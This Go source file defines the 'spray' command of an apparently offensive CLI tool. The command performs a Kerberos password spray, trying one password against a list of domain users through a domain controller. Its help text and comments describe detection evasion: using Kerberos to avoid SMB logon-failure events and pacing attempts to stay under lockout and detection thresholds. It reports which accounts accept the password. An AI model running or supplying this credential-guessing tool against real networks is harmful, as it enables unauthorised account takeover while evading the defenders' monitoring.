package cli

import (
	"fmt"
	"strings"
	"time"

	"github.com/spf13/cobra"

	"anvil/internal/krbuser"
	"anvil/internal/ui"
)

// sprayProgressInterval is how often a running summary is printed during a
// spray; per-attempt lines are reserved for successes and lockouts.
const sprayProgressInterval = 25

func newSprayCmd() *cobra.Command {
	var domain, dcIP, usersFile, password string
	var delay time.Duration
	var stopOnSuccess int

	cmd := &cobra.Command{
		Use:   "spray",
		Short: "Kerberos password spray — one password against many users",
		Long: "Try ONE password against every user in the file via the Kerberos AS exchange. " +
			"Spraying over Kerberos avoids SMB's per-failure log noise (a 4625 on the target per " +
			"attempt); a Kerberos pre-auth failure is a single 4768/4771 pair on the DC. Each " +
			"attempt is still a real authentication that increments the bad-password count, so if " +
			"ANY attempt comes back LOCKED the run aborts immediately: a lockout was just observed, " +
			"the target has a lockout threshold, and continuing would lock more accounts.",
		Args: cobra.NoArgs,
		RunE: func(cmd *cobra.Command, args []string) error {
			if err := krbuser.ValidateTarget(domain, dcIP); err != nil {
				return err
			}
			if err := krbuser.ValidateSprayParams(password, delay, stopOnSuccess); err != nil {
				return err
			}
			users, err := krbuser.LoadUsers(usersFile)
			if err != nil {
				return err
			}

			// The password is deliberately never printed — secret hygiene.
			fmt.Printf("%s  %s via %s %s\n",
				ui.Muted.Sprint("SPRAY"),
				strings.ToUpper(domain),
				dcIP,
				ui.Faint.Sprintf("(%d users, 1 password)", len(users)))

			var successes, failures, attempted int
			summary := func() {
				fmt.Println()
				ui.Muted.Println("SUMMARY")
				printCount("success", successes, ui.Accent)
				printCount("fail", failures, nil)
				fmt.Printf("  %s%d/%d attempted\n", ui.Muted.Sprintf("%-15s", "progress"), attempted, len(users))
			}

			for i, u := range users {
				r := krbuser.TryPassword(domain, dcIP, u, password)
				attempted++

				switch {
				case r.Verdict == krbuser.VerdictLocked:
					// A lockout was just observed. Continuing would burn
					// the remaining users against a live lockout
					// threshold and lock them too — stop now, loudly,
					// and show the tally to this point.
					failures++
					fmt.Println()
					ui.Warm.Printf("  !! LOCKOUT OBSERVED — %s is locked/disabled (lockout threshold may be tripped)\n", r.Username)
					ui.Warm.Println("  !! ABORTING SPRAY: continuing would lock more accounts")
					summary()
					return nil
				case r.PasswordOK:
					successes++
					line := fmt.Sprintf("  %-24s%s", r.Username, ui.Accent.Sprint("SUCCESS"))
					if r.Detail != "password correct" {
						// KEY_EXPIRED: password proven but must change.
						line += " " + ui.Muted.Sprintf("(%s)", r.Detail)
					}
					fmt.Println(line)
					if stopOnSuccess > 0 && successes >= stopOnSuccess {
						ui.Faint.Printf("  stopping after %d successes (--stop-on-success)\n", successes)
						summary()
						return nil
					}
				default:
					// Wrong password, nonexistent user, transport blip —
					// all just failures here; details go to --debug so the
					// per-attempt stream stays signal-only.
					failures++
					ui.Debugf("spray %s: %s (%s)", r.Username, r.Verdict, r.Detail)
				}

				if attempted%sprayProgressInterval == 0 && attempted < len(users) {
					ui.Faint.Printf("  ... %d/%d attempted: %d success, %d fail\n",
						attempted, len(users), successes, failures)
				}

				// Pace attempts to stay under lockout-observation and
				// detection thresholds; no sleep after the final attempt.
				if delay > 0 && i < len(users)-1 {
					time.Sleep(delay)
				}
			}

			summary()
			return nil
		},
	}

	f := cmd.Flags()
	f.StringVarP(&domain, "domain", "d", "", "DNS domain / realm, e.g. lab.local (required)")
	f.StringVar(&dcIP, "dc-ip", "", "KDC address, optionally host:port (required)")
	f.StringVarP(&usersFile, "users", "u", "", "username file, one per line, '#' comments (required)")
	f.StringVarP(&password, "password", "p", "", "the single password to spray (required)")
	f.DurationVar(&delay, "delay", 0, "delay between attempts, e.g. 2s (default: none)")
	f.IntVar(&stopOnSuccess, "stop-on-success", 0, "stop after N successful logins (0: run to the end)")
	return cmd
}
